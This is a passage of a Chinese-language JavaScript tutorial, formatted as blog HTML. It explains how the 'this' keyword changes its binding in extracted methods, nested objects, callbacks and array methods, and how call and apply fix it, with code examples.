obj</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>obj.foo</code>方法执行时，它内部的<code>this</code>指向<code>obj</code>。</p><p>但是，下面这几种用法，都会改变<code>this</code>的指向。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.<span class="property">foo</span> = obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, obj.<span class="property">foo</span>)() <span class="comment">// window</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>obj.foo</code>就是一个值。这个值真正调用的时候，运行环境已经不是<code>obj</code>了，而是全局环境，所以<code>this</code>不再指向<code>obj</code>。</p><p>可以这样理解，JavaScript 引擎内部，<code>obj</code>和<code>obj.foo</code>储存在两个内存地址，称为地址一和地址二。<code>obj.foo()</code>这样调用时，是从地址一调用地址二，因此地址二的运行环境是地址一，<code>this</code>指向<code>obj</code>。但是，上面三种情况，都是直接取出地址二进行调用，这样的话，运行环境就是全局环境，因此<code>this</code>指向全局环境。上面三种情况等同于下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 情况一</span></span><br><span class="line">(obj.<span class="property">foo</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况二</span></span><br><span class="line">(<span class="literal">false</span> || <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 情况三</span></span><br><span class="line">(<span class="number">1</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>如果<code>this</code>所在的方法不在对象的第一层，这时<code>this</code>只是指向当前一层的对象，而不会继承更上面的层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">a.<span class="property">b</span>.<span class="title function_">m</span>() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>a.b.m</code>方法在<code>a</code>对象的第二层，该方法内部的<code>this</code>不是指向<code>a</code>，而是指向<code>a.b</code>，因为实际执行的是下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = &#123;</span><br><span class="line">  <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span>,</span><br><span class="line">  <span class="attr">b</span>: b</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(a.<span class="property">b</span>).<span class="title function_">m</span>() <span class="comment">// 等同于 b.m()</span></span><br></pre></td></tr></table></figure><p>如果要达到预期效果，只有写成下面这样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果这时将嵌套对象内部的方法赋值给一个变量，<code>this</code>依然会指向全局对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">m</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">p</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">p</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hello = a.<span class="property">b</span>.<span class="property">m</span>;</span><br><span class="line"><span class="title function_">hello</span>() <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>m</code>是多层对象内部的一个方法。为求简便，将其赋值给<code>hello</code>变量，结果调用时，<code>this</code>指向了顶层对象。为了避免这个问题，可以只将<code>m</code>所在的对象赋值给<code>hello</code>，这样调用时，<code>this</code>的指向就不会变。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hello = a.<span class="property">b</span>;</span><br><span class="line">hello.<span class="title function_">m</span>() <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure><h3 id="0x0103-this的使用注意事项"><a href="#0x0103-this的使用注意事项" class="headerlink" title="0x0103 this的使用注意事项"></a>0x0103 this的使用注意事项</h3><h4 id="0x010301-避免多层-this"><a href="#0x010301-避免多层-this" class="headerlink" title="0x010301 避免多层 this"></a>0x010301 避免多层 this</h4><p>由于<code>this</code>的指向是不确定的，所以切勿在函数中包含多层的<code>this</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f1</span>()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Window</span></span><br></pre></td></tr></table></figure><p>上面代码包含两层<code>this</code>，结果运行后，第一层指向对象<code>o</code>，第二层指向全局对象，因为实际执行的是下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> temp = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="title function_">temp</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个解决方法是在第二层改用一个指向外层<code>this</code>的变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">f1</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">var</span> that = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">var</span> f2 = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(that);</span><br><span class="line">    &#125;();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f1</span>()</span><br><span class="line"><span class="comment">// Object</span></span><br><span class="line"><span class="comment">// Object</span></span><br></pre></td></tr></table></figure><p>上面代码定义了变量<code>that</code>，固定指向外层的<code>this</code>，然后在内层使用<code>that</code>，就不会发生<code>this</code>指向的改变。</p><p>事实上，使用一个变量固定<code>this</code>的值，然后内层函数调用这个变量，是非常常见的做法，请务必掌握。</p><p>JavaScript 提供了严格模式，也可以硬性避免这种问题。严格模式下，如果函数内部的<code>this</code>指向顶层对象，就会报错。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = &#123;</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">counter.<span class="property">inc</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">count</span>++</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> f = counter.<span class="property">inc</span>;</span><br><span class="line"><span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// TypeError: Cannot read property &#x27;count&#x27; of undefined</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>inc</code>方法通过<code>&#39;use strict&#39;</code>声明采用严格模式，这时内部的<code>this</code>一旦指向顶层对象，就会报错。</p><h4 id="0x010302-避免数组处理方法中的this"><a href="#0x010302-避免数组处理方法中的this" class="headerlink" title="0x010302 避免数组处理方法中的this"></a>0x010302 避免数组处理方法中的this</h4><p>数组的<code>map</code>和<code>foreach</code>方法，允许提供一个函数作为参数。这个函数内部不应该使用<code>this</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span> + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// undefined a1</span></span><br><span class="line"><span class="comment">// undefined a2</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>foreach</code>方法的回调函数中的<code>this</code>，其实是指向<code>window</code>对象，因此取不到<code>o.v</code>的值。原因跟上一段的多层<code>this</code>是一样的，就是内层的<code>this</code>不指向外部，而指向顶层对象。</p><p>解决这个问题的一种方法，就是前面提到的，使用中间变量固定<code>this</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(that.<span class="property">v</span>+<span class="string">&#x27; &#x27;</span>+item);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure><p>另一种方法是将<code>this</code>当作<code>foreach</code>方法的第二个参数，固定它的运行环境。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">  <span class="attr">v</span>: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">  <span class="attr">p</span>: [ <span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span> ],</span><br><span class="line">  <span class="attr">f</span>: <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">p</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">v</span> + <span class="string">&#x27; &#x27;</span> + item);</span><br><span class="line">    &#125;, <span class="variable language_">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o.<span class="title function_">f</span>()</span><br><span class="line"><span class="comment">// hello a1</span></span><br><span class="line"><span class="comment">// hello a2</span></span><br></pre></td></tr></table></figure><h4 id="0x010303-避免回调函数中的this"><a href="#0x010303-避免回调函数中的this" class="headerlink" title="0x010303 避免回调函数中的this"></a>0x010303 避免回调函数中的this</h4><p>回调函数中的<code>this</code>往往会改变指向，最好避免使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">o.<span class="property">f</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span> === o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery 的写法</span></span><br><span class="line">$(<span class="string">&#x27;#button&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, o.<span class="property">f</span>);</span><br></pre></td></tr></table></figure><p>上面代码中，点击按钮以后，控制台会显示<code>false</code>。原因是此时<code>this</code>不再指向<code>o</code>对象，而是指向按钮的 DOM 对象，因为<code>f</code>方法是在按钮对象的环境中被调用的。这种细微的差别，很容易在编程中忽视，导致难以察觉的错误。</p><p>为了解决这个问题，可以采用下面的一些方法对<code>this</code>进行绑定，也就是使得<code>this</code>固定指向某个对象，减少不确定性。</p><h3 id="0x0104-绑定this的方法"><a href="#0x0104-绑定this的方法" class="headerlink" title="0x0104 绑定this的方法"></a>0x0104 绑定this的方法</h3><p><code>this</code>的动态切换，固然为 JavaScript 创造了巨大的灵活性，但也使得编程变得困难和模糊。有时，需要把<code>this</code>固定下来，避免出现意想不到的情况。JavaScript 提供了<code>call</code>、<code>apply</code>、<code>bind</code>这三个方法，来切换&#x2F;固定<code>this</code>的指向。</p><h4 id="0x010401-Function-prototype-call"><a href="#0x010401-Function-prototype-call" class="headerlink" title="0x010401 Function.prototype.call()"></a>0x010401 Function.prototype.call()</h4><p>函数实例的<code>call</code>方法，可以指定函数内部<code>this</code>的指向（即函数执行时所在的作用域），然后在所指定的作用域中，调用该函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>() === <span class="variable language_">window</span> <span class="comment">// true</span></span><br><span class="line">f.<span class="title function_">call</span>(obj) === obj <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>上面代码中，全局环境运行函数<code>f</code>时，<code>this</code>指向全局环境（浏览器为<code>window</code>对象）；<code>call</code>方法可以改变<code>this</code>的指向，指定<code>this</code>指向对象<code>obj</code>，然后在对象<code>obj</code>的作用域中运行函数<code>f</code>。</p><p><code>call</code>方法的参数，应该是一个对象。如果参数为空、<code>null</code>和<code>undefined</code>，则默认传入全局对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">n</span>: <span class="number">456</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">call</span>() <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(<span class="literal">null</span>) <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(<span class="literal">undefined</span>) <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(<span class="variable language_">window</span>) <span class="comment">// 123</span></span><br><span class="line">a.<span class="title function_">call</span>(obj) <span class="comment">// 456</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>a</code>函数中的<code>this</code>关键字，如果指向全局对象，返回结果为<code>123</code>。如果使用<code>call</code>方法将<code>this</code>关键字指向<code>obj</code>对象，返回结果为<code>456</code>。可以看到，如果<code>call</code>方法没有参数，或者参数为<code>null</code>或<code>undefined</code>，则等同于指向全局对象。</p><p>如果<code>call</code>方法的参数是一个原始值，那么这个原始值会自动转成对应的包装对象，然后传入<code>call</code>方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f.<span class="title function_">call</span>(<span class="number">5</span>)</span><br><span class="line"><span class="comment">// Number &#123;[[PrimitiveValue]]: 5&#125;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>call</code>的参数为<code>5</code>，不是对象，会被自动转成包装对象（<code>Number</code>的实例），绑定<code>f</code>内部的<code>this</code>。</p><p><code>call</code>方法还可以接受多个参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.<span class="title function_">call</span>(thisValue, arg1, arg2, ...)</span><br></pre></td></tr></table></figure><p><code>call</code>的第一个参数就是<code>this</code>所要指向的那个对象，后面的参数则是函数调用时所需的参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="number">1</span>, <span class="number">2</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>call</code>方法指定函数<code>add</code>内部的<code>this</code>绑定当前环境（对象），并且参数为<code>1</code>和<code>2</code>，因此函数<code>add</code>运行后得到<code>3</code>。</p><p><code>call</code>方法的一个应用是调用对象的原生方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆盖掉继承的 hasOwnProperty 方法</span></span><br><span class="line">obj.<span class="property">hasOwnProperty</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line">obj.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;toString&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(obj, <span class="string">&#x27;toString&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>hasOwnProperty</code>是<code>obj</code>对象继承的方法，如果这个方法一旦被覆盖，就不会得到正确结果。<code>call</code>方法可以解决这个问题，它将<code>hasOwnProperty</code>方法的原始定义放到<code>obj</code>对象上执行，这样无论<code>obj</code>上有没有同名方法，都不会影响结果。</p><h4 id="0x010402-Function-prototype-apply"><a href="#0x010402-Function-prototype-apply" class="headerlink" title="0x010402 Function.prototype.apply()"></a>0x010402 Function.prototype.apply()</h4><p><code>apply</code>方法的作用与<code>call</code>方法类似，也是改变<code>this</code>指向，然后再调用该函数。唯一的区别就是，它接收一个数组作为函数执行时的参数，使用格式如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func.<span class="title function_">apply</span>(thisValue, [arg1, arg2, ...])</span><br></pre></td></tr></table></figure><p><code>apply</code>方法的第一个参数也是<code>this</code>所要指向的那个对象，如果设为<code>null</code>或<code>undefined</code>，则等同于指定全局对象。第二个参数则是一个数组，该数组的所有成员依次作为参数，传入原函数。原函数的参数，在<code>call</code>方法中必须一个个添加，但是在<code>apply</code>方法中，必须以数组形式添加。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x, y</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f.<span class="title function_">call</span>(<span class="literal">null</span>, <span class="number">1</span>, <span class="number">1</span>) <span class="comment">// 2</span></span><br><span class="line">f.<span class="title function_">apply</span>(<span class="literal">null</span>, [<span class="number">1</span>, <span class="number">1</span>]) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>f</code>函数本来接受两个参数，使用<code>apply</code>方法以后，就变成可以接受一个数组作为参数。</p><p>利用这一点，可以做一些有趣的应用。</p><p><strong>（1）找出数组最大元素</strong></p><p>JavaScript 不提供找出数组最大元素的函数。结合使用<code>apply</code>方法和<code>Math.max</code>方法，就可以返回数组的最大元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">10</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>];</span><br><span class="line"><span class="title class_">Math</span>.<span class="property">max</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, a) <span class="comment">// 15</span></span><br></pre></td></tr></table></figure><p><strong>（2）将数组的空元素变为<code>undefined</code></strong></p><p>通过<code>apply</code>方法，利用<code>Array</code>构造函数将数组的空元素变成<code>undefined</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, [<span class="string">&#x27;a&#x27;</span>, ,<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, undefined, 